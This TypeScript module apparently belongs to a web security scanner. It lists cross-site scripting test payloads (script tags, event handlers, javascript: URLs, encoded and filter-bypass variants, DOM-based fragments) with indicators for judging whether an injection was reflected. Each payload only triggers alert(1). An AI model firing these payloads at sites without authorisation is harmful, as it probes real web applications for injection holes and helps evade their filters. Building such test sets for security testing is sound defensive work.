import { Payload, PayloadSet, generatePayloadId } from "./payload-types";

const reflectedPayloads: Payload[] = [
  {
    id: generatePayloadId("xss", "reflected", 1),
    category: "xss",
    technique: "reflected",
    riskLevel: "safe",
    value: "<script>alert(1)</script>",
    description: "Basic script tag injection",
    expectedBehavior: "Script tag reflected in response without encoding",
    successIndicators: [
      "<script>alert(1)</script>",
    ],
    failureIndicators: [
      "&lt;script&gt;",
      "blocked",
      "filtered",
    ],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("xss", "reflected", 2),
    category: "xss",
    technique: "reflected",
    riskLevel: "safe",
    value: "<img src=x onerror=alert(1)>",
    description: "IMG tag with onerror event handler",
    expectedBehavior: "IMG tag reflected with event handler intact",
    successIndicators: [
      "<img src=x onerror=alert(1)>",
      "onerror=",
    ],
    failureIndicators: [
      "&lt;img",
      "blocked",
    ],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("xss", "reflected", 3),
    category: "xss",
    technique: "reflected",
    riskLevel: "safe",
    value: "<svg onload=alert(1)>",
    description: "SVG tag with onload event",
    expectedBehavior: "SVG tag reflected with event handler",
    successIndicators: [
      "<svg onload=alert(1)>",
      "onload=",
    ],
    failureIndicators: [
      "&lt;svg",
    ],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("xss", "reflected", 4),
    category: "xss",
    technique: "reflected",
    riskLevel: "safe",
    value: "\"><script>alert(1)</script>",
    description: "Attribute escape with script injection",
    expectedBehavior: "Escapes attribute context and injects script",
    successIndicators: [
      "\"><script>",
    ],
    failureIndicators: [
      "&quot;&gt;&lt;script",
    ],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("xss", "reflected", 5),
    category: "xss",
    technique: "reflected",
    riskLevel: "safe",
    value: "'-alert(1)-'",
    description: "JavaScript context injection",
    expectedBehavior: "Breaks out of string context in JS",
    successIndicators: [
      "'-alert(1)-'",
    ],
    failureIndicators: [
      "\\'",
    ],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("xss", "reflected", 6),
    category: "xss",
    technique: "reflected",
    riskLevel: "safe",
    value: "<body onload=alert(1)>",
    description: "BODY tag with onload event",
    expectedBehavior: "Body tag with event handler reflected",
    successIndicators: [
      "<body onload=",
    ],
    failureIndicators: [
      "&lt;body",
    ],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("xss", "reflected", 7),
    category: "xss",
    technique: "reflected",
    riskLevel: "safe",
    value: "<iframe src=\"javascript:alert(1)\">",
    description: "Iframe with javascript: protocol",
    expectedBehavior: "Iframe reflected with javascript protocol",
    successIndicators: [
      "javascript:alert",
    ],
    failureIndicators: [
      "blocked",
    ],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("xss", "reflected", 8),
    category: "xss",
    technique: "reflected",
    riskLevel: "safe",
    value: "<a href=\"javascript:alert(1)\">click</a>",
    description: "Anchor with javascript: protocol",
    expectedBehavior: "Anchor tag with javascript href reflected",
    successIndicators: [
      "javascript:alert",
    ],
    failureIndicators: [
      "blocked",
    ],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
];

const encodedPayloads: Payload[] = [
  {
    id: generatePayloadId("xss", "reflected", 20),
    category: "xss",
    technique: "reflected",
    riskLevel: "safe",
    value: "%3Cscript%3Ealert(1)%3C/script%3E",
    description: "URL encoded script tag",
    expectedBehavior: "Decoded and reflected as script",
    successIndicators: [
      "<script>alert(1)</script>",
    ],
    failureIndicators: [
      "&lt;script",
    ],
    applicableContexts: ["url_param"],
    encoding: "url",
  },
  {
    id: generatePayloadId("xss", "reflected", 21),
    category: "xss",
    technique: "reflected",
    riskLevel: "safe",
    value: "&#60;script&#62;alert(1)&#60;/script&#62;",
    description: "HTML entity encoded script tag",
    expectedBehavior: "Decoded and reflected as script",
    successIndicators: [
      "<script>alert(1)</script>",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "html",
  },
  {
    id: generatePayloadId("xss", "reflected", 22),
    category: "xss",
    technique: "reflected",
    riskLevel: "safe",
    value: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    description: "Unicode escaped script tag",
    expectedBehavior: "Decoded and reflected as script in JS context",
    successIndicators: [
      "<script>",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "unicode",
  },
];

const filterBypassPayloads: Payload[] = [
  {
    id: generatePayloadId("xss", "reflected", 30),
    category: "xss",
    technique: "reflected",
    riskLevel: "safe",
    value: "<ScRiPt>alert(1)</sCrIpT>",
    description: "Mixed case script tag to bypass filters",
    expectedBehavior: "Case-insensitive filter bypass",
    successIndicators: [
      "script",
      "alert",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("xss", "reflected", 31),
    category: "xss",
    technique: "reflected",
    riskLevel: "safe",
    value: "<scr<script>ipt>alert(1)</scr</script>ipt>",
    description: "Nested script tag to bypass recursive filters",
    expectedBehavior: "Filter removes inner script, leaves outer",
    successIndicators: [
      "<script>alert",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("xss", "reflected", 32),
    category: "xss",
    technique: "reflected",
    riskLevel: "safe",
    value: "<img src=x onerror=\"alert(1)\">",
    description: "Event handler with double quotes",
    expectedBehavior: "Event handler executes",
    successIndicators: [
      "onerror=",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("xss", "reflected", 33),
    category: "xss",
    technique: "reflected",
    riskLevel: "safe",
    value: "<img/src=x onerror=alert(1)>",
    description: "Slashless IMG tag variation",
    expectedBehavior: "Browser parses as valid IMG tag",
    successIndicators: [
      "<img",
      "onerror=",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
];

const domBasedPayloads: Payload[] = [
  {
    id: generatePayloadId("xss", "dom_based", 1),
    category: "xss",
    technique: "dom_based",
    riskLevel: "safe",
    value: "#<script>alert(1)</script>",
    description: "Fragment-based DOM XSS",
    expectedBehavior: "Script execution via DOM manipulation",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["url_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("xss", "dom_based", 2),
    category: "xss",
    technique: "dom_based",
    riskLevel: "safe",
    value: "javascript:alert(1)//",
    description: "JavaScript protocol in URL context",
    expectedBehavior: "Script execution when used in href/src",
    successIndicators: [
      "javascript:",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param"],
    encoding: "none",
  },
];

export const xssPayloadSet: PayloadSet = {
  category: "xss",
  name: "Cross-Site Scripting Payloads",
  description: "Comprehensive XSS test payloads including reflected, encoded, filter bypass, and DOM-based variants",
  payloads: [
    ...reflectedPayloads,
    ...encodedPayloads,
    ...filterBypassPayloads,
    ...domBasedPayloads,
  ],
};

export function getXssPayloads(technique?: string): Payload[] {
  if (!technique) return xssPayloadSet.payloads;
  return xssPayloadSet.payloads.filter(p => p.technique === technique);
}

export function getXssPayloadsByEncoding(encoding: "none" | "url" | "base64" | "html" | "unicode"): Payload[] {
  return xssPayloadSet.payloads.filter(p => p.encoding === encoding);
}
